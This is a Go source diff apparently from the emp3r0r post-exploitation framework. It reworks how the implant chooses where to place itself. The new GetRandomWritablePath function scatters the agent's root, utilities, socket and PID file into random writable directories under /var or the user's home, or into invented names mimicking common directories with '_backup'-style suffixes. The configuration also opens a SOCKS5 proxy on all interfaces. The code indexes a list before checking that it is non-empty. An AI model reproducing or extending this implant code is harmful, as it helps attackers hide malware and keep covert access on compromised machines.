@@ -4,7 +4,7 @@ import (
 	"fmt"
 	"log"
 	"os"
-	"runtime"
+	"path/filepath"
 	"strings"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
@@ -41,25 +41,23 @@ func ApplyRuntimeConfig() (err error) {
 	// CA
 	tun.CACrt = []byte(RuntimeConfig.CAPEM)
 
-	// change agent root to /usr/share/bash-completion/completions/helpers
+	// pwd
+	cwd, err := os.Getwd()
+	if err != nil {
+		return fmt.Errorf("os.Getwd: %v", err)
+	}
+
 	agent_root_base := util.FileBaseName(RuntimeConfig.AgentRoot)
-	if runtime.GOOS == "windows" {
-		agent_root_base = strings.ReplaceAll(agent_root_base, "ssh-", "")
+	prefix, err := GetRandomWritablePath()
+	if err != nil {
+		log.Printf("GetRandomWritablePath: %v, falling back to current directory", err)
+		prefix = cwd
 	}
-	if HasRoot() && runtime.GOOS == "linux" {
-		prefix := "/usr/share/bash-completion/completions/helpers/"
-		RuntimeConfig.AgentRoot = fmt.Sprintf("%s/%s", prefix, agent_root_base)
-		RuntimeConfig.UtilsPath = strings.ReplaceAll(RuntimeConfig.UtilsPath, "/tmp/", prefix)
-		RuntimeConfig.SocketName = strings.ReplaceAll(RuntimeConfig.SocketName, "/tmp/", prefix)
-		RuntimeConfig.PIDFile = strings.ReplaceAll(RuntimeConfig.PIDFile, "/tmp/", prefix)
-		log.Printf("Agent root: %s", RuntimeConfig.AgentRoot)
-	} else {
-		prefix := os.TempDir() + "/" // /tmp/ on Linux and macOS, C:\Users\username\AppData\Local\Temp\ on Windows
-		RuntimeConfig.AgentRoot = fmt.Sprintf("%s/%s", prefix, agent_root_base)
-		RuntimeConfig.UtilsPath = strings.ReplaceAll(RuntimeConfig.UtilsPath, "/tmp/", prefix)
-		RuntimeConfig.SocketName = strings.ReplaceAll(RuntimeConfig.SocketName, "/tmp/", prefix)
-		RuntimeConfig.PIDFile = strings.ReplaceAll(RuntimeConfig.PIDFile, "/tmp/", prefix)
-	}
+	RuntimeConfig.AgentRoot = fmt.Sprintf("%s/%s", prefix, agent_root_base)
+	RuntimeConfig.UtilsPath = fmt.Sprintf("%s/%s", prefix, RuntimeConfig.UtilsPath)
+	RuntimeConfig.SocketName = fmt.Sprintf("%s/%s", prefix, RuntimeConfig.SocketName)
+	RuntimeConfig.PIDFile = fmt.Sprintf("%s/%s", prefix, RuntimeConfig.PIDFile)
+	log.Printf("Agent root: %s", RuntimeConfig.AgentRoot)
 
 	// Socks5 proxy server
 	addr := fmt.Sprintf("0.0.0.0:%s", RuntimeConfig.AutoProxyPort)
@@ -67,4 +65,68 @@ func ApplyRuntimeConfig() (err error) {
 		RuntimeConfig.ShadowsocksPort, RuntimeConfig.Password,
 		RuntimeConfig.AutoProxyTimeout, RuntimeConfig.AutoProxyTimeout)
 	return
+}
+
+// GetRandomWritablePath get a random writable path for privileged or normal user
+func GetRandomWritablePath() (string, error) {
+	var paths []string
+	root_path := os.TempDir()
+	if HasRoot() {
+		root_path = "/var"
+	}
+
+	// Helper function to append writable paths
+	appendWritablePaths := func(basePath string) {
+		writablePaths, err := util.GetWritablePaths(basePath, 4)
+		if err == nil {
+			paths = append(paths, writablePaths...)
+		}
+	}
+
+	appendWritablePaths(root_path)
+
+	homeDir, err := os.UserHomeDir()
+	if err == nil {
+		appendWritablePaths(homeDir)
+	}
+
+	// if emp3r0r's agent root already exists?
+	for _, path := range paths {
+		if util.FileBaseName(path) == RuntimeConfig.AgentRoot {
+			// just use it
+			return filepath.Dir(path), nil // return parent dir of path
+		}
+	}
+
+	just_get_one := func() string {
+		rand_common_path := emp3r0r_data.CommonDirs[util.RandInt(0, len(emp3r0r_data.CommonDirs))]
+		suffixes := []string{"_tmp", "_temp", "_backup", "_copy"}
+		rand_suffix := suffixes[util.RandInt(0, len(suffixes))]
+		if util.IsExist(rand_common_path) {
+			rand_common_path += rand_suffix
+		}
+		return rand_common_path
+	}
+
+	if len(paths) == 0 {
+		return just_get_one(), nil
+	}
+
+	// Filter paths to ensure they are level 3 or above
+	var level3Paths []string
+	for _, path := range paths {
+		if strings.Count(path, "/") >= 3 {
+			level3Paths = append(level3Paths, path)
+		}
+	}
+
+	rand_path := level3Paths[util.RandInt(0, len(level3Paths))]
+	if len(level3Paths) == 0 {
+		rand_path = just_get_one()
+	}
+
+	if !strings.HasSuffix(rand_path, "/") {
+		rand_path += "/"
+	}
+	return rand_path, nil
 }
